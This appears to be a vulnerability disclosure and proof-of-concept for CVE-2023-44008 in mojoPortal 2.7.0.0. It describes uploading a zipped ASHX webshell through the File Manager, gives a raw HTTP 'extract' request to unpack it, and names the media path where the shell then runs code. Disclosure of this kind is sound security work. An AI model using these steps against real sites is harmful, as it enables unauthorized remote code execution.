# CVE-2023-44008
## Basic Information
- Date: 29/09/2023
- Affected Version: mojoPortal 2.7.0.0
- Vendor Homepage: https://www.mojoportal.com/
- Exploit Author: Hoang of VietSunshine Cyber Security Services

## Description
File Upload vulnerability in mojoPortal v.2.7.0.0 allows a remote attacker to execute arbitrary code via the File Manager function
## Attack Vectors
- Compressed a ashx webshell and upload the file to **File Manager** function

![1.png](screenshots/1.png)

![2.png](screenshots/2.png)

- Extract the uploaded file

![3.png](screenshots/3.png)

![4.png](screenshots/4.png)

RAW REQUEST
```
POST /fileservice?t=b12135e4-2c7e-4b16-99aa-39680b2545de HTTP/1.1
Host: mojoportal.local
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8
Content-Length: 84
Origin: http://mojoportal.local
Connection: close
Referer: http://mojoportal.local/FileManager?view=fullpage
Cookie: [...TRUNCATED...]

{"action":"extract","item":"/poc/shell.zip","destination":"/poc","folderName":"PoC"}
```
- Access http://[site]/Data/Sites/1/media/[path]/[extracted_folder]/[webshell] to execute malicious code
![5.png](screenshots/5.png)